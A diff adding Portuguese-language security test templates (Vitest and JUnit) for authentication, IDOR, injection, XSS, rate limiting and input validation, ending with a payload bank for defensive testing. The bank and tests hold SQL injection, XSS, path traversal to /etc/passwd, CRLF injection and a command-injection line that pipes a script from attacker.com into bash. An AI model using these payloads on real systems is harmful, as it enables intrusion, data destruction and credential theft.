@@ -136,3 +136,418 @@ Ao detectar feature complexa (auth, crypto, upload, pagamento):
 - Percentual de PRs com testes de segurança
 - Tempo médio de correção de vulnerabilidades
 - Número de violações bloqueadas pelos hooks
+
+
+---
+
+## Templates de Testes de Segurança
+
+> Exemplos prontos de testes para cada categoria principal. Copie e adapte ao seu projeto.
+
+### Teste de 401 — Sem Token
+
+**TypeScript (Vitest)**
+```typescript
+import { describe, it, expect } from 'vitest';
+import request from 'supertest';
+import { app } from '../src/app';
+
+describe('Authentication - 401 Unauthorized', () => {
+  it('should_return_401_when_no_auth_token_provided', async () => {
+    const response = await request(app)
+      .get('/api/v1/users/me')
+      .set('Accept', 'application/json');
+
+    expect(response.status).toBe(401);
+    expect(response.body).not.toHaveProperty('stack');
+    expect(response.body.message).toBe('Authentication required');
+  });
+
+  it('should_return_401_when_token_is_expired', async () => {
+    const expiredToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNjAwMDAwMDAwfQ.invalid';
+    const response = await request(app)
+      .get('/api/v1/users/me')
+      .set('Authorization', `Bearer ${expiredToken}`);
+
+    expect(response.status).toBe(401);
+  });
+});
+```
+
+**Java (JUnit + Spring Boot)**
+```java
+@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
+class AuthenticationTest {
+
+    @Autowired
+    private TestRestTemplate restTemplate;
+
+    @Test
+    void should_return_401_when_no_auth_token_provided() {
+        ResponseEntity<String> response = restTemplate
+            .getForEntity("/api/v1/users/me", String.class);
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);
+        assertThat(response.getBody()).doesNotContain("stackTrace");
+    }
+
+    @Test
+    void should_return_401_when_token_is_malformed() {
+        HttpHeaders headers = new HttpHeaders();
+        headers.set("Authorization", "Bearer invalid.token.here");
+
+        ResponseEntity<String> response = restTemplate.exchange(
+            "/api/v1/users/me", HttpMethod.GET,
+            new HttpEntity<>(headers), String.class);
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);
+    }
+}
+```
+
+---
+
+### Teste de 403 — Token de Outro Usuário (IDOR/BOLA)
+
+**TypeScript (Vitest)**
+```typescript
+describe('Authorization - 403 Forbidden (IDOR)', () => {
+  it('should_return_403_when_user_accesses_other_users_resource', async () => {
+    const userAToken = await getTokenForUser('user-a-id');
+
+    const response = await request(app)
+      .get('/api/v1/users/user-b-id/orders')
+      .set('Authorization', `Bearer ${userAToken}`);
+
+    expect(response.status).toBe(403);
+    expect(response.body.message).toBe('Access denied');
+    expect(response.body).not.toHaveProperty('data');
+  });
+
+  it('should_return_403_when_regular_user_accesses_admin_endpoint', async () => {
+    const regularToken = await getTokenForUser('regular-user-id');
+
+    const response = await request(app)
+      .get('/api/v1/admin/users')
+      .set('Authorization', `Bearer ${regularToken}`);
+
+    expect(response.status).toBe(403);
+  });
+});
+```
+
+**Java (JUnit + Spring Boot)**
+```java
+@Test
+@WithMockUser(username = "user-a", roles = {"USER"})
+void should_return_403_when_user_accesses_other_users_resource() throws Exception {
+    mockMvc.perform(get("/api/v1/users/user-b-id/orders")
+            .contentType(MediaType.APPLICATION_JSON))
+        .andExpect(status().isForbidden())
+        .andExpect(jsonPath("$.data").doesNotExist());
+}
+
+@Test
+@WithMockUser(username = "regular-user", roles = {"USER"})
+void should_return_403_when_regular_user_accesses_admin_endpoint() throws Exception {
+    mockMvc.perform(get("/api/v1/admin/users"))
+        .andExpect(status().isForbidden());
+}
+```
+
+---
+
+### Teste de SQL Injection — Payload Malicioso
+
+**TypeScript (Vitest)**
+```typescript
+describe('SQL Injection Prevention', () => {
+  const sqlPayloads = [
+    "' OR '1'='1",
+    "'; DROP TABLE users; --",
+    "' UNION SELECT password FROM users --",
+    "1; DELETE FROM orders WHERE 1=1",
+    "admin'--"
+  ];
+
+  it.each(sqlPayloads)(
+    'should_not_execute_sql_when_input_contains: %s',
+    async (payload) => {
+      const response = await request(app)
+        .get(`/api/v1/users/search`)
+        .query({ name: payload })
+        .set('Authorization', `Bearer ${validToken}`);
+
+      expect(response.status).toBeOneOf([400, 200]);
+      // Verificar que dados não foram alterados
+      const usersCount = await db.query('SELECT COUNT(*) FROM users');
+      expect(usersCount).toBe(originalCount);
+    }
+  );
+});
+```
+
+**Java (JUnit + Spring Boot)**
+```java
+@ParameterizedTest
+@ValueSource(strings = {
+    "' OR '1'='1",
+    "'; DROP TABLE users; --",
+    "' UNION SELECT password FROM users --",
+    "1; DELETE FROM orders WHERE 1=1",
+    "admin'--"
+})
+void should_not_execute_sql_when_input_contains_injection(String payload) throws Exception {
+    long countBefore = userRepository.count();
+
+    mockMvc.perform(get("/api/v1/users/search")
+            .param("name", payload)
+            .with(jwt()))
+        .andExpect(status().isIn(200, 400));
+
+    assertThat(userRepository.count()).isEqualTo(countBefore);
+}
+```
+
+---
+
+### Teste de XSS — Payload em Input
+
+**TypeScript (Vitest)**
+```typescript
+describe('XSS Prevention', () => {
+  const xssPayloads = [
+    '<script>alert("xss")</script>',
+    '<img src=x onerror=alert(1)>',
+    '"><svg onload=alert(document.cookie)>',
+    "javascript:alert('xss')",
+    '<iframe src="javascript:alert(1)">'
+  ];
+
+  it.each(xssPayloads)(
+    'should_not_reflect_xss_payload_in_response: %s',
+    async (payload) => {
+      const response = await request(app)
+        .post('/api/v1/comments')
+        .set('Authorization', `Bearer ${validToken}`)
+        .send({ content: payload });
+
+      const body = JSON.stringify(response.body);
+      expect(body).not.toContain('<script>');
+      expect(body).not.toContain('onerror=');
+      expect(body).not.toContain('onload=');
+      expect(body).not.toContain('javascript:');
+    }
+  );
+});
+```
+
+**Java (JUnit + Spring Boot)**
+```java
+@ParameterizedTest
+@ValueSource(strings = {
+    "<script>alert('xss')</script>",
+    "<img src=x onerror=alert(1)>",
+    "\"><svg onload=alert(document.cookie)>",
+    "javascript:alert('xss')",
+    "<iframe src=\"javascript:alert(1)\">"
+})
+void should_not_reflect_xss_payload_in_response(String payload) throws Exception {
+    String requestBody = String.format("{\"content\": \"%s\"}", 
+        payload.replace("\"", "\\\""));
+
+    MvcResult result = mockMvc.perform(post("/api/v1/comments")
+            .contentType(MediaType.APPLICATION_JSON)
+            .content(requestBody)
+            .with(jwt()))
+        .andReturn();
+
+    String responseBody = result.getResponse().getContentAsString();
+    assertThat(responseBody).doesNotContain("<script>");
+    assertThat(responseBody).doesNotContain("onerror=");
+    assertThat(responseBody).doesNotContain("onload=");
+}
+```
+
+---
+
+### Teste de Rate Limiting — Muitas Requests
+
+**TypeScript (Vitest)**
+```typescript
+describe('Rate Limiting - 429 Too Many Requests', () => {
+  it('should_return_429_when_rate_limit_exceeded', async () => {
+    const requests = Array.from({ length: 110 }, () =>
+      request(app)
+        .get('/api/v1/products')
+        .set('Authorization', `Bearer ${validToken}`)
+    );
+
+    const responses = await Promise.all(requests);
+    const tooManyRequests = responses.filter(r => r.status === 429);
+
+    expect(tooManyRequests.length).toBeGreaterThan(0);
+    expect(tooManyRequests[0].headers['retry-after']).toBeDefined();
+  });
+
+  it('should_return_429_after_5_failed_login_attempts', async () => {
+    for (let i = 0; i < 6; i++) {
+      const response = await request(app)
+        .post('/api/v1/auth/login')
+        .send({ email: 'user@test.com', password: 'wrong' });
+
+      if (i >= 5) {
+        expect(response.status).toBe(429);
+      }
+    }
+  });
+});
+```
+
+**Java (JUnit + Spring Boot)**
+```java
+@Test
+void should_return_429_when_rate_limit_exceeded() throws Exception {
+    int rateLimitHits = 0;
+
+    for (int i = 0; i < 110; i++) {
+        MvcResult result = mockMvc.perform(get("/api/v1/products")
+                .with(jwt()))
+            .andReturn();
+
+        if (result.getResponse().getStatus() == 429) {
+            rateLimitHits++;
+        }
+    }
+
+    assertThat(rateLimitHits).isGreaterThan(0);
+}
+
+@Test
+void should_return_429_after_5_failed_login_attempts() throws Exception {
+    for (int i = 0; i < 6; i++) {
+        ResultActions result = mockMvc.perform(post("/api/v1/auth/login")
+            .contentType(MediaType.APPLICATION_JSON)
+            .content("{\"email\":\"user@test.com\",\"password\":\"wrong\"}"));
+
+        if (i >= 5) {
+            result.andExpect(status().isTooManyRequests());
+        }
+    }
+}
+```
+
+---
+
+### Teste de Input Validation — Campo Acima do Limite
+
+**TypeScript (Vitest)**
+```typescript
+describe('Input Validation - Field Limits', () => {
+  it('should_return_400_when_name_exceeds_100_characters', async () => {
+    const longName = 'A'.repeat(101);
+
+    const response = await request(app)
+      .post('/api/v1/users')
+      .set('Authorization', `Bearer ${adminToken}`)
+      .send({ name: longName, email: 'test@example.com' });
+
+    expect(response.status).toBe(400);
+    expect(response.body.errors).toBeDefined();
+  });
+
+  it('should_return_400_when_body_exceeds_max_size', async () => {
+    const hugePayload = { data: 'X'.repeat(1_048_577) }; // > 1MB
+
+    const response = await request(app)
+      .post('/api/v1/upload/json')
+      .set('Authorization', `Bearer ${validToken}`)
+      .send(hugePayload);
+
+    expect(response.status).toBeOneOf([400, 413]);
+  });
+
+  it('should_return_400_when_email_format_is_invalid', async () => {
+    const response = await request(app)
+      .post('/api/v1/users')
+      .set('Authorization', `Bearer ${adminToken}`)
+      .send({ name: 'Test', email: 'not-an-email' });
+
+    expect(response.status).toBe(400);
+  });
+});
+```
+
+**Java (JUnit + Spring Boot)**
+```java
+@Test
+void should_return_400_when_name_exceeds_100_characters() throws Exception {
+    String longName = "A".repeat(101);
+    String body = String.format("{\"name\":\"%s\",\"email\":\"test@example.com\"}", longName);
+
+    mockMvc.perform(post("/api/v1/users")
+            .contentType(MediaType.APPLICATION_JSON)
+            .content(body)
+            .with(jwt().authorities(new SimpleGrantedAuthority("ROLE_ADMIN"))))
+        .andExpect(status().isBadRequest())
+        .andExpect(jsonPath("$.errors").exists());
+}
+
+@Test
+void should_return_400_when_email_format_is_invalid() throws Exception {
+    mockMvc.perform(post("/api/v1/users")
+            .contentType(MediaType.APPLICATION_JSON)
+            .content("{\"name\":\"Test\",\"email\":\"not-an-email\"}")
+            .with(jwt().authorities(new SimpleGrantedAuthority("ROLE_ADMIN"))))
+        .andExpect(status().isBadRequest());
+}
+```
+
+---
+
+### Banco de Payloads para Testes
+
+> Payloads organizados por categoria para uso em testes automatizados e manuais.
+
+#### SQL Injection Payloads
+
+```text
+' OR '1'='1' --
+' UNION SELECT username, password FROM users --
+'; DROP TABLE users; --
+1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' OR 1=1; INSERT INTO admin_users(username,password) VALUES('hacker','pwd') --
+```
+
+#### XSS Payloads
+
+```text
+<script>alert('XSS')</script>
+<img src=x onerror=alert(document.cookie)>
+"><svg/onload=alert('XSS')>
+javascript:alert('XSS')
+<div onmouseover="alert('XSS')">hover me</div>
+```
+
+#### Command Injection Payloads
+
+```text
+; cat /etc/passwd
+| whoami
+$(curl http://attacker.com/shell.sh | bash)
+```
+
+#### Path Traversal Payloads
+
+```text
+../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+....//....//....//etc/passwd
+```
+
+#### CRLF Injection Payloads
+
+```text
+%0d%0aSet-Cookie:%20malicious=true
+%0d%0aLocation:%20http://attacker.com
+```
